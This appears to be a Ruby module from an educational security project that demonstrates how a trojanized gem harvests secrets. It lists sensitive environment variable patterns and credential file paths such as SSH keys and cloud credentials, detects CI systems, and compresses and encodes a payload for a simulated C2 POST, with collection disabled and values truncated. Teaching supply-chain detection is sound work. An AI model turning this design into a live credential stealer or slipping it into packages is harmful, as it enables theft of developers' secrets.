# frozen_string_literal: true

# =============================================================================
# RubyGuardian Phase 1b -- EvilLogger Data Exfiltrator
#
# EDUCATIONAL PURPOSE ONLY -- Authorized security research.
# DO NOT use this module for unauthorized data collection.
#
# Demonstrates data exfiltration techniques used by trojanized gems.
# This module collects environment data (credentials, tokens, keys) and
# queues it for exfiltration to a C2 server. ALL collection and
# exfiltration is DISABLED by default and requires explicit opt-in.
#
# MITRE ATT&CK:
#   T1041     - Exfiltration Over C2 Channel
#   T1567     - Exfiltration Over Web Service
#   T1560.001 - Archive Collected Data: Archive via Utility
#   T1005     - Data from Local System
#
# DETECTION METHODS:
#   - Monitor outbound HTTP/DNS traffic during gem install/test
#   - Audit gems that access ENV, File.read on sensitive paths
#   - Network policy: deny outbound from CI build containers
#   - Check for Base64-encoded data in HTTP POST bodies
# =============================================================================

require 'json'
require 'base64'
require 'zlib'

module EvilLogger
  class Exfiltrator
    # Sensitive environment variable patterns to scan for
    SENSITIVE_ENV_PATTERNS = [
      /AWS_/i, /AZURE_/i, /GCP_/i, /GOOGLE_/i,
      /API_KEY/i, /SECRET/i, /TOKEN/i, /PASSWORD/i,
      /PRIVATE_KEY/i, /CREDENTIALS/i, /AUTH/i,
      /DATABASE_URL/i, /REDIS_URL/i, /MONGO/i,
      /GITHUB_TOKEN/i, /GITLAB_TOKEN/i, /NPM_TOKEN/i,
      /DOCKER_/i, /REGISTRY/i, /DEPLOY/i,
      /SSH_/i, /GPG_/i, /SIGNING/i
    ].freeze

    # Sensitive file paths to check for
    SENSITIVE_FILES = [
      '~/.aws/credentials',
      '~/.ssh/id_rsa',
      '~/.ssh/id_ed25519',
      '~/.netrc',
      '~/.npmrc',
      '~/.gem/credentials',
      '~/.docker/config.json',
      '~/.kube/config',
      '~/.config/gh/hosts.yml',
      '.env',
      '.env.local',
      '.env.production'
    ].freeze

    # CI/CD environment indicators
    CI_INDICATORS = {
      github_actions: 'GITHUB_ACTIONS',
      gitlab_ci: 'GITLAB_CI',
      circleci: 'CIRCLECI',
      travis: 'TRAVIS',
      jenkins: 'JENKINS_URL',
      azure_pipelines: 'TF_BUILD',
      bitbucket: 'BITBUCKET_PIPELINE_UUID'
    }.freeze

    attr_reader :queue, :collection_log, :enabled

    def initialize(host: nil, port: 443, enabled: false)
      @host = host
      @port = port
      @enabled = enabled # SAFETY: Disabled by default
      @queue = []
      @collection_log = []
      @mutex = Mutex.new
      @max_queue_size = 100
    end

    # Collect environment data for exfiltration.
    #
    # EDUCATIONAL: This demonstrates what a trojanized gem would collect.
    # It scans for sensitive environment variables, credential files, and
    # CI/CD pipeline information. ALL collection is DISABLED unless
    # explicitly enabled via the constructor.
    #
    # @return [Hash, nil] Collected data or nil if disabled
    def collect_environment
      return log_disabled('collect_environment') unless @enabled

      data = {
        type: :environment_scan,
        timestamp: Time.now.utc.iso8601,
        hostname: safe_hostname,
        username: safe_username,
        ruby_version: RUBY_VERSION,
        platform: RUBY_PLATFORM,
        pid: Process.pid,
        ci_environment: detect_ci_environment,
        sensitive_env_vars: scan_environment_variables,
        sensitive_files: scan_sensitive_files,
        loaded_gems: scan_loaded_gems,
        network_info: scan_network_info
      }

      queue_data(data)
      log_collection(:environment_scan, data.keys)
      data
    end

    # Queue data for exfiltration.
    #
    # @param data [Hash] Data to queue
    def queue_data(data)
      return log_disabled('queue_data') unless @enabled

      @mutex.synchronize do
        @queue.shift if @queue.length >= @max_queue_size
        @queue << {
          id: SecureRandom.hex(8),
          queued_at: Time.now.utc.iso8601,
          data: data
        }
      end
    end

    # Simulate exfiltration (DOES NOT actually send data).
    #
    # EDUCATIONAL: This method documents how exfiltration would work
    # but intentionally does NOT make any network connections.
    # In a real trojan, this would POST encoded data to the C2 server.
    #
    # @return [Hash] Simulation result (no actual network activity)
    def simulate_exfiltration
      return log_disabled('simulate_exfiltration') unless @enabled

      pending = @mutex.synchronize { @queue.dup }
      return { status: :empty, message: 'No data in queue' } if pending.empty?

      # Demonstrate the encoding that WOULD be applied
      payload = encode_payload(pending)

      {
        status: :simulated,
        warning: 'EDUCATIONAL ONLY -- No data was actually transmitted',
        would_send_to: "https://#{@host}:#{@port}/api/exfil",
        payload_size: payload.bytesize,
        items_count: pending.length,
        encoding: 'zlib + base64',
        http_method: 'POST',
        content_type: 'application/x-www-form-urlencoded',
        headers: {
          'User-Agent' => 'Mozilla/5.0 (compatible; Ruby logging)',
          'X-Request-ID' => SecureRandom.uuid
        }
      }
    end

    # Drain the exfiltration queue.
    def drain_queue!
      @mutex.synchronize { @queue.clear }
    end

    # Get a summary of collection activities.
    def collection_summary
      {
        enabled: @enabled,
        c2_host: @enabled ? @host : '<disabled>',
        queue_depth: @queue.length,
        total_collections: @collection_log.length,
        collections: @collection_log
      }
    end

    private

    def log_disabled(operation)
      # Silently return nil when disabled -- this is the safe default
      nil
    end

    def safe_hostname
      Socket.gethostname
    rescue StandardError
      'unknown'
    end

    def safe_username
      ENV['USER'] || ENV['USERNAME'] || 'unknown'
    end

    # Scan environment variables for sensitive data.
    #
    # EDUCATIONAL: This is a primary exfiltration technique for CI/CD
    # attacks. Pipeline secrets are often exposed as environment variables.
    def scan_environment_variables
      matches = {}
      ENV.each do |key, value|
        if SENSITIVE_ENV_PATTERNS.any? { |pat| key.match?(pat) }
          # EDUCATIONAL: Real malware would capture the full value.
          # We capture only metadata for safety.
          matches[key] = {
            present: true,
            length: value.length,
            preview: "#{value[0, 4]}***" # Only first 4 chars
          }
        end
      end
      matches
    end

    # Check for existence of sensitive files (does NOT read contents).
    #
    # EDUCATIONAL: Real malware would read and exfiltrate file contents.
    # We only check existence for safety.
    def scan_sensitive_files
      SENSITIVE_FILES.each_with_object({}) do |path, results|
        expanded = File.expand_path(path)
        results[path] = {
          exists: File.exist?(expanded),
          readable: File.readable?(expanded),
          size: (File.size(expanded) rescue nil)
        }
      rescue StandardError
        results[path] = { exists: false, error: true }
      end
    end

    # Detect CI/CD environment.
    def detect_ci_environment
      detected = CI_INDICATORS.select { |_name, env_var| ENV.key?(env_var) }
      {
        is_ci: !detected.empty?,
        environments: detected.keys,
        details: {
          github_repo: ENV['GITHUB_REPOSITORY'],
          github_ref: ENV['GITHUB_REF'],
          github_actor: ENV['GITHUB_ACTOR'],
          gitlab_project: ENV['CI_PROJECT_NAME'],
          build_id: ENV['BUILD_ID'] || ENV['CI_BUILD_ID']
        }.compact
      }
    end

    # List loaded gems and versions.
    def scan_loaded_gems
      if defined?(Gem) && Gem.respond_to?(:loaded_specs)
        Gem.loaded_specs.map { |name, spec| { name: name, version: spec.version.to_s } }
      else
        []
      end
    rescue StandardError
      []
    end

    # Gather basic network information.
    def scan_network_info
      {
        interfaces: Dir.glob('/sys/class/net/*/address').each_with_object({}) do |path, h|
          iface = File.basename(File.dirname(path))
          h[iface] = File.read(path).strip rescue nil
        end
      }
    rescue StandardError
      {}
    end

    # Encode payload for exfiltration transport.
    def encode_payload(data)
      json = JSON.generate(data)
      compressed = Zlib::Deflate.deflate(json)
      Base64.strict_encode64(compressed)
    end

    def log_collection(type, keys)
      @collection_log << {
        timestamp: Time.now.utc.iso8601,
        type: type,
        data_keys: keys
      }
    end
  end
end
